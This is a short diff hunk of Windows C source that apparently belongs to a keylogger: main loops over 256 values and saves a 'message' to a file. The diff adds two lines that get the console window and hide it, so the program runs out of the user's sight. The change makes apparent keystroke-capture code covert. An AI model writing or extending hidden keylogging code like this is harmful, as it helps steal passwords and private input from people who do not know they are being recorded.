@@ -11,6 +11,8 @@ void save_to_file(const char* filename, char message) {
     fclose(file);
 }
 int main() {
+    HWND hwnd = GetConsoleWindow();   // Get the console window handle
+    ShowWindow(hwnd, SW_HIDE);        // Hide the window
     char message;
     while(1){
         for(int i = 0; i < 256; i++) {
